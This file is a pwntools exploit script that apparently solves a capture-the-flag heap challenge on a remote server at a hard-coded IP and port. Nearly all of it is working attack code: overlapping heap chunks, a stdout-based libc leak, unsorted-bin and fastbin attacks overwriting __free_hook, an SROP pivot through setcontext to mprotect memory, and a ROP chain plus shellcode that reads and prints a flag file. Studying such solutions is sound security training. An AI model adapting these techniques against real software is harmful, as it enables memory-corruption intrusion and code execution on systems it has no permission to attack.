#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './pwn'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('101.71.29.5', 10005)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/8gx $rebase(0x202060)
        end
    b free
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(size, content):
    sh.sendlineafter('Your Choice: ', '1')
    sh.sendlineafter(': ', str(size))
    sh.sendafter(': ' , content)

def delete(index):
    sh.sendlineafter('Your Choice: ', '2')
    sh.sendlineafter(': ', str(index))

def edit(index, content):
    sh.sendlineafter('Your Choice: ', '3')
    sh.sendlineafter(': ', str(index))
    sh.sendafter(': ' , content)

add(0x68, '\n')
add(0x78, '\n')
add(0x68, (p64(0) + p64(0x21)) * 6 + '\n')
add(0x68, (p64(0) + p64(0x21)) * 6 + '\n')


delete(0)
add(0x68, 'a' * 0x60 + p64(0) + p8(0xf1))
delete(1)
delete(2)
add(0x78, '\n')

delete(0)
add(0x68, 'a' * 0x60 + p64(0) + p8(0xa1))
delete(1)
add(0x98, '\n')
edit(1, 'b' * 0x70 + p64(0) + p64(0x71) + p16(0x25dd))

add(0x68, '\n')
add(0x68, 'c' * 0x33 + p64(0xfbad2887 | 0x1000) + p64(0) * 3 + '\n')
sh.recvn(0x88)
libc_addr = u64(sh.recvn(8)) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))

# unsortbin attack
edit(1, 'b' * 0x70 + p64(0) + p64(0x91))
delete(2)
edit(1, 'b' * 0x70 + p64(0) + p64(0x91) + p64(0) + p64(libc_addr + libc.symbols['__free_hook'] - 0x20))
add(0x88, '\n')

# fastbin attack
edit(1, 'b' * 0x70 + p64(0) + p64(0x71))
delete(2)
edit(1, 'b' * 0x70 + p64(0) + p64(0x71) + p64(libc_addr + libc.symbols['__free_hook'] - 0x13))

# hijack __free_hook and SROP
frame = SigreturnFrame()
frame.rdi = 0
frame.rsi = (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000 #
frame.rdx = 0x2000
frame.rsp = (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000 
frame.rip = libc_addr + 0x00000000000bc375 #: syscall; ret; 
payload = str(frame)
add(0x68, payload[0x80:0x80 + 0x60] + '\n')
add(0x68, 'fff' + p64(libc_addr + libc.symbols['setcontext'] + 53) + '\n')

edit(1, payload[:0x98])
delete(1)

layout = [
    libc_addr + 0x0000000000021102, #: pop rdi; ret; 
    (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000,
    libc_addr + 0x00000000000202e8, #: pop rsi; ret; 
    0x2000,
    libc_addr + 0x0000000000001b92, #: pop rdx; ret; 
    7,
    libc_addr + 0x0000000000033544, #: pop rax; ret; 
    10,
    libc_addr + 0x00000000000bc375, #: syscall; ret; 
    libc_addr + 0x0000000000002a71, #: jmp rsp; 
]

shellcode = asm('''
sub rsp, 0x800
push 0x67616c66
mov rdi, rsp
xor esi, esi
mov eax, 2
syscall

cmp eax, 0
js failed

mov edi, eax
mov rsi, rsp
mov edx, 0x100
xor eax, eax
syscall

mov edx, eax
mov rsi, rsp
mov edi, 1
mov eax, edi
syscall

jmp exit

failed:
push 0x6c696166
mov edi, 1
mov rsi, rsp
mov edx, 4
mov eax, edi
syscall

exit:
xor edi, edi
mov eax, 231
syscall
''')
sh.send(flat(layout) + shellcode)

sh.interactive()
clear()